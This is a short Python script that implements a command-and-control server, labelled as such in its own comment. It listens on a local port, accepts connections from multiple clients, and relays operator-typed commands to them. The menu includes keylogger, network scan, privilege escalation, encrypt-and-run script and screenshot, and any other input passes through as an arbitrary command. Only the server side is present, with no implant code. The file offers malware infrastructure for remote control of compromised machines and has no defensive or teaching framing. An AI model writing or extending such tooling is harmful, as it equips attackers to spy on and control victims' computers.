import socket
import threading

# Configuration
HOST = '127.0.0.1'  # C&C server IP address
PORT = 9999         # C&C server port

clients = []

def handle_client(client_socket, client_address):
    print(f"[*] Connection established with {client_address}")

    while True:
        try:
            command = input(f"Enter command for {client_address}: ")
            if command.lower() == 'exit':
                client_socket.send('exit'.encode())
                break
            elif command.lower() == 'keylogger':
                client_socket.send('keylogger'.encode())
            elif command.lower() == 'scan_network':
                client_socket.send('scan_network'.encode())
            elif command.lower() == 'privilege_escalation':
                client_socket.send('privilege_escalation'.encode())
            elif command.lower() == 'encrypt_and_run_script':
                client_socket.send('encrypt_and_run_script'.encode())
            elif command.lower() == 'screenshot':
                client_socket.send('screenshot'.encode())
            else:
                client_socket.send(command.encode())

            response = client_socket.recv(4096).decode()
            print(f"Response from {client_address}:\n{response}")
        except:
            print(f"Connection with {client_address} lost.")
            break

    client_socket.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"[*] Server listening on {HOST}:{PORT}")

    while True:
        client_socket, client_address = server_socket.accept()
        clients.append(client_socket)
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_handler.start()

if __name__ == "__main__":
    start_server()
